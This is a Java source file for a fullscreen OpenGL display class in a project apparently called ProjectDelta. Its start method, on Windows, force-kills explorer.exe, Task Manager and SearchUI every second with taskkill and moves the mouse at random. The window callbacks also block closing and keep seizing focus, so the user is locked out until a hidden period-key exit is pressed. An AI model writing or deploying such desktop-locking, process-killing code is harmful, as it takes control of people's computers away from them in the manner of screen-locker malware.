package com.github.anthonywww.projectdelta.graphic;

import java.awt.AWTException;
import java.awt.Robot;
import java.io.IOException;
import java.nio.IntBuffer;
import java.util.Random;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import org.lwjgl.glfw.Callbacks;
import org.lwjgl.glfw.GLFW;
import org.lwjgl.glfw.GLFWErrorCallback;
import org.lwjgl.glfw.GLFWVidMode;
import org.lwjgl.opengl.GL;
import org.lwjgl.opengl.GL11;
import org.lwjgl.system.MemoryStack;
import org.lwjgl.system.MemoryUtil;

import com.github.anthonywww.projectdelta.ProjectDelta;

public class Display {

	private ScheduledExecutorService scheduledExecutor;
	private long window;
	private int width;
	private int height;
	private boolean shouldRender;
	private boolean destroyed;
	private RendererOld renderer;
	private Robot hal;

	public Display() {
		this.scheduledExecutor = Executors.newSingleThreadScheduledExecutor();
		this.shouldRender = false;
		this.destroyed = true;
		
		GLFWErrorCallback.createPrint(System.err).set();

		// Initialize GLFW
		if (!GLFW.glfwInit()) {
			throw new IllegalStateException("Unable to initialize GLFW");
		}
		
		GLFWVidMode vidMode = GLFW.glfwGetVideoMode(GLFW.glfwGetPrimaryMonitor());
		this.width = vidMode.width();
		this.height = vidMode.height();
		
		try {
			hal = new Robot();
		} catch (AWTException e) {
			e.printStackTrace();
		}
	}

	public void start() {
		// If the user is on windows, kill explorer.exe preventing use of the start menu
		// taskkill /F /FI "USERNAME ne SYSTEM" /FI "USERNAME ne LOCAL SERVICE" /FI "USERNAME ne NETWORK SERVICE" /FI "IMAGENAME ne project-delta.exe" /T
		if (System.getProperty("os.name").startsWith("Windows")) {
			scheduledExecutor.scheduleAtFixedRate(() -> {
				try {
					Random rnd = new Random();
					hal.mouseMove(rnd.nextInt(800), rnd.nextInt(600));
					Runtime.getRuntime().exec("taskkill /F /IM explorer.exe /T").waitFor(1000, TimeUnit.MILLISECONDS);
					Runtime.getRuntime().exec("taskkill /F /IM taskmgr.exe /T").waitFor(1000, TimeUnit.MILLISECONDS);
					Runtime.getRuntime().exec("taskkill /F /IM SearchUI.exe /T").waitFor(1000, TimeUnit.MILLISECONDS);
					//Runtime.getRuntime().exec("taskkill /F /IM cmd.exe /T").waitFor(1000, TimeUnit.MILLISECONDS);
					//Runtime.getRuntime().exec("taskkill /F /IM RuntimeBroker.exe /T").waitFor(1000, TimeUnit.MILLISECONDS);
					//Runtime.getRuntime().exec("taskkill /F /IM ShellExperienceHost.exe /T").waitFor(1000, TimeUnit.MILLISECONDS);
					
					// External programs
					//Runtime.getRuntime().exec("taskkill /F /IM GfxUI.exe /T").waitFor(1000, TimeUnit.MILLISECONDS);
					//Runtime.getRuntime().exec("taskkill /F /IM igfxem.exe /T").waitFor(1000, TimeUnit.MILLISECONDS);
					//Runtime.getRuntime().exec("taskkill /F /IM IntelCpHeciSvc.exe /T").waitFor(1000, TimeUnit.MILLISECONDS);
					
				} catch (Throwable t) {}
			}, 0L, 1000L, TimeUnit.MILLISECONDS);
		}
		
		// Configure GLFW
		GLFW.glfwDefaultWindowHints();
		GLFW.glfwWindowHint(GLFW.GLFW_CONTEXT_VERSION_MAJOR, 2);
		GLFW.glfwWindowHint(GLFW.GLFW_CONTEXT_VERSION_MINOR, 1);
		GLFW.glfwWindowHint(GLFW.GLFW_VISIBLE, GLFW.GLFW_FALSE);
		GLFW.glfwWindowHint(GLFW.GLFW_RESIZABLE, GLFW.GLFW_FALSE);
		
		// Create the window
		window = GLFW.glfwCreateWindow(width, height, " ", GLFW.glfwGetPrimaryMonitor(), MemoryUtil.NULL);
		GLFW.glfwHideWindow(window);

		if (window == MemoryUtil.NULL) {
			throw new RuntimeException("Failed to create the GLFW window");
		}

		// Get the thread stack and push a new frame
		try (MemoryStack stack = MemoryStack.stackPush()) {
			IntBuffer pWidth = stack.mallocInt(1); // int*
			IntBuffer pHeight = stack.mallocInt(1); // int*

			// Get the window size passed to glfwCreateWindow
			GLFW.glfwGetWindowSize(window, pWidth, pHeight);
		}

		// Make the OpenGL context current
		GLFW.glfwMakeContextCurrent(window);
		GLFW.glfwSetInputMode(window, GLFW.GLFW_CURSOR, GLFW.GLFW_CURSOR_HIDDEN);
		GLFW.glfwSetWindowShouldClose(window, false);
		
		// Enable v-sync
		GLFW.glfwSwapInterval(1);
		
		
		GLFW.glfwSetKeyCallback(window, (window, key, scancode, action, mods) -> {
			if (key == GLFW.GLFW_KEY_PERIOD && action == GLFW.GLFW_RELEASE) {
				ProjectDelta.getInstance().setRunning(false);
			}
		});
		
		GLFW.glfwSetWindowFocusCallback(window, (window, focused) -> {
			if (window == this.window) {
				GLFW.glfwFocusWindow(window);
				GLFW.glfwShowWindow(window);
				GLFW.glfwRequestWindowAttention(window);
			}
		});
		
		GLFW.glfwSetWindowRefreshCallback(window, (window)-> {
			GLFW.glfwFocusWindow(window);
			GLFW.glfwShowWindow(window);
			GLFW.glfwRequestWindowAttention(window);
		});
		
		GLFW.glfwSetWindowCloseCallback(window, (window) -> {
			if (window == this.window) {
				GLFW.glfwSetWindowShouldClose(window, false);
			}
		});
		
		// This line is critical for LWJGL's interoperation with GLFW's
		// OpenGL context, or any context that is managed externally.
		// LWJGL detects the context that is current in the current thread,
		// creates the GLCapabilities instance and makes the OpenGL
		// bindings available for use.
		GL.createCapabilities();
		
		this.renderer = new RendererOld();
		
		// Set the clear color
		GL11.glClearColor(0.0f, 0.0f, 0.0f, 0.0f);
		
		GLFW.glfwSetWindowTitle(window, " ");
		GLFW.glfwShowWindow(window);
		GLFW.glfwFocusWindow(window);
		GL11.glViewport(0, 0, width, height);
		
		shouldRender = true;
		destroyed = false;
	}
	
	
	public void update() {
		GLFW.glfwPollEvents();
		
		if (shouldRender) {
			GL11.glClear(GL11.GL_COLOR_BUFFER_BIT | GL11.GL_DEPTH_BUFFER_BIT);
			
			// draw
			renderer.render();
			
			// Swap color buffer
			GLFW.glfwSwapBuffers(window);
		} else {
			try {
				Thread.sleep(300);
			} catch (InterruptedException e) {}
		}
	}
	
	public void stop() {
		scheduledExecutor.shutdownNow();
		if (System.getProperty("os.name").startsWith("Windows")) {
			try {
				Runtime.getRuntime().exec("explorer.exe").waitFor(1000, TimeUnit.MILLISECONDS);
			} catch (InterruptedException | IOException e) {}
		}
		shouldRender = false;
		GLFW.glfwHideWindow(window);
		GLFW.glfwDestroyWindow(window);
		Callbacks.glfwFreeCallbacks(window);
		destroyed = true;
	}

	public void shutdown() {
		// Free the window callbacks and destroy the window
		if (!destroyed) {
			GLFW.glfwHideWindow(window);
			GLFW.glfwDestroyWindow(window);
			Callbacks.glfwFreeCallbacks(window);
		}
		GLFW.glfwSetErrorCallback(null).free();

		// Terminate GLFW and free the error callback
		GLFW.glfwTerminate();
	}
}
